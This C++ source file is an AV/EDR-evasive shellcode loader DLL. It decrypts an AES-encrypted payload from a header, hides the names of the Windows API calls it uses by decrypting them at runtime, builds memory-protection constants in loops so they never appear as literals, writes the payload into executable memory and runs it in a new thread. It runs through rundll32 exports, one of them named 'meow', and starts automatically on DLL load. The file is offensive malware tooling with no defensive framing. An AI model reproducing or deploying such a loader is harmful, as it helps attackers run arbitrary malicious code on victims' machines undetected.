#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <stdlib.h>
#include "shellcode.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")

typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef VOID (WINAPI *pRtlMoveMemory)(PVOID, const VOID*, SIZE_T);
typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

pVirtualAlloc dynVirtualAlloc = NULL;
pRtlMoveMemory dynMoveMemory = NULL;
pCreateThread dynCreateThread = NULL;
pVirtualProtect dynVirtualProtect = NULL;

#ifdef STANDALONE
#define USE_HEADER_KEY
#endif


void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    
    // extract IV
    BYTE iv[16];
    
    char *originalShellcode = shellcode;
    shellcode += OFFSET_HEAD;
    
    memcpy(iv, shellcode, 16);
    char *cipherText = shellcode + 16;
    DWORD cipherTextLen = shellcodeLen - 16 - OFFSET_HEAD - OFFSET_TAIL;
    
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }
    
    // IV
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }
    
    // Decrypt
    if (!CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)cipherText, &cipherTextLen)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }
    
    memmove(originalShellcode, cipherText, cipherTextLen);
    if(cipherTextLen < shellcodeLen)
        originalShellcode[cipherTextLen] = '\0';
    
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}


BOOL InitDynamicFunctions(char* key, DWORD keyLen) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    unsigned char VA[] = {VIRTUALALLOC};
    unsigned char RMM[] = {RTLMOVEMEMORY};
    unsigned char CT[] = {CREATETHREAD};
    unsigned char VP[] = {VIRTUALPROTECT};

    DecryptAES((char*)VA, sizeof(VA), key, keyLen);
    DecryptAES((char*)RMM, sizeof(RMM), key, keyLen);
    DecryptAES((char*)CT, sizeof(CT), key, keyLen);
    DecryptAES((char*)VP, sizeof(VP), key, keyLen);
/*
    MessageBoxA(NULL, (char*)VA, "Decrypted VA", MB_OK);
    MessageBoxA(NULL, (char*)RMM, "Decrypted RMM", MB_OK);
    MessageBoxA(NULL, (char*)CT, "Decrypted CT", MB_OK);
    MessageBoxA(NULL, (char*)VP, "Decrypted VP", MB_OK);
*/
    
    dynVirtualAlloc = (pVirtualAlloc)GetProcAddress(hKernel32, (char*)VA);
    dynMoveMemory = (pRtlMoveMemory)GetProcAddress(hKernel32, (char*)RMM);
    dynCreateThread = (pCreateThread)GetProcAddress(hKernel32, (char*)CT);
    dynVirtualProtect = (pVirtualProtect)GetProcAddress(hKernel32, (char*)VP);

    if (!dynVirtualAlloc || !dynMoveMemory || !dynCreateThread || !dynVirtualProtect) {
        MessageBoxA(NULL, "Dyn init failed", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    return TRUE;
}

#ifdef USE_HEADER_KEY
void CALLBACK run(void) {
    unsigned char key[] = { KEY }; 
    DWORD keyLen = sizeof(key);

    unsigned char payload[] = { PAYLOAD };
    DWORD payloadLen = sizeof(payload);

    if (!InitDynamicFunctions((char*)key, keyLen)) {
        return;
    }

    int t=1;
    int page_readwrite = 0;
    int page_execute_read = 0;
    int zero = 3;
    int mem_commit_mem_reserve = 0;
    for (int i=0; i<4; i++) page_readwrite +=t;
    for (int i=0; i<0x20; i++) page_execute_read+=t; 
    for (int i=0; i<3; i++) zero -= t;
    for (int i=0; i<0x3000; i++) mem_commit_mem_reserve+=t;

    LPVOID allocMem = dynVirtualAlloc(NULL, payloadLen, mem_commit_mem_reserve, page_readwrite);
    if (!allocMem) {
        free(key);
        return;
    }

    DecryptAES((char*)payload, payloadLen, (char*)key, keyLen);
    dynMoveMemory(allocMem, payload, payloadLen);

    DWORD oldProtect;
    if (!dynVirtualProtect(allocMem, payloadLen, page_execute_read, &oldProtect)) {
        free(key);
        return;
    }

    HANDLE tHandle = dynCreateThread(zero, 0, (LPTHREAD_START_ROUTINE)allocMem, zero, zero, zero);
    if (!tHandle) {
        free(key);
        return;
    }
    WaitForSingleObject(tHandle, INFINITE);
    //((void(*)())allocMem)();
}
#else
void CALLBACK run(char* key, DWORD keyLen) {
    unsigned char payload[] = { PAYLOAD };
    DWORD payloadLen = sizeof(payload);

    if (!InitDynamicFunctions((char*)key, keyLen)) {
        free(key);
        return;
    }
    
    int t=1;
    int page_readwrite = 0;
    int page_execute_read = 0;
    int zero = 3;
    int mem_commit_mem_reserve = 0;
    for (int i=0; i<4; i++) page_readwrite +=t;
    for (int i=0; i<0x20; i++) page_execute_read+=t; 
    for (int i=0; i<3; i++) zero -= t;
    for (int i=0; i<0x3000; i++) mem_commit_mem_reserve+=t;

    LPVOID allocMem = dynVirtualAlloc(NULL, payloadLen, mem_commit_mem_reserve, page_readwrite);
    if (!allocMem) {
        free(key);
        return;
    }

    DecryptAES((char*)payload, payloadLen, (char*)key, keyLen);
    dynMoveMemory(allocMem, payload, payloadLen);

    DWORD oldProtect;
    if (!dynVirtualProtect(allocMem, payloadLen, page_execute_read, &oldProtect)) {
        free(key);
        return;
    }

    HANDLE tHandle = dynCreateThread(zero, 0, (LPTHREAD_START_ROUTINE)allocMem, zero, zero, zero);
    if (!tHandle) {
        free(key);
        return;
    }
    WaitForSingleObject(tHandle, INFINITE);


    free(key);
}
#endif

// Entry for rundll32
extern "C" __declspec(dllexport)
void CALLBACK EPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
#ifdef USE_HEADER_KEY
    // Mode1: standalone. KEY was coded into dll.
    run();
#else
    // Mode2: key was NOT coded into dll.
    run(lpszCmdLine, lstrlenA(lpszCmdLine));
#endif
}

#ifdef USE_HEADER_KEY
DWORD WINAPI ThreadProc(LPVOID lpParam) {
    run();
    return 0;
}
#endif

extern "C" __declspec(dllexport)
void CALLBACK meow(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
#ifdef USE_HEADER_KEY
    // Mode1: standalone. KEY was coded into dll.
    run();
#else
    // Mode2: key was NOT coded into dll.
    run(lpszCmdLine, lstrlenA(lpszCmdLine));
#endif
}

#ifdef USE_HEADER_KEY
DWORD WINAPI ThreadProc(LPVOID lpParam) {
    run();
    return 0;
}
#endif


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
#ifdef USE_HEADER_KEY
            CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
            break;
#endif
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
